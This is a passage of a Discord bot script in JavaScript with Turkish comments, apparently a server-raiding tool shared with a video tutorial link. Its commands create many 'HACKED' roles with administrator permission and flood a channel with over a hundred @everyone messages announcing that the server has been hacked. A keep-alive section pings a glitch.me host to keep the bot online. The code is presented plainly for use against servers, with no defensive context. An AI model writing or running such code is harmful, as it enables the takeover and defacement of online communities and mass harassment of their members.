      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "4200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "7C00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "A200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "C500FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "E000FF",  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF00F3",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF00B6",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF0097",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF005D",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF0032",
      permissions: ["ADMINISTRATOR"]
    });
  }
});

client.on('message', msg => {
  if (msg.content === '+spam') { //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:');   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
  }
});


const http = require("http");
const express = require("express");
const app = express();
    function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) { 
    if ((new Date().getTime() - start) > milliseconds){         //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT BİRŞEY DEĞİŞTİRMEYİN
      break;
    }
  }    
}
app.get("/", (request, response) => {
  console.log(Date.now() + " Ping tamamdır.");  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);   //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT BİRŞEY DEĞİŞTİRMEYİN
}, 3000);


//TÜM TELİF HAKKI ENES ACARA AİTTİR ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk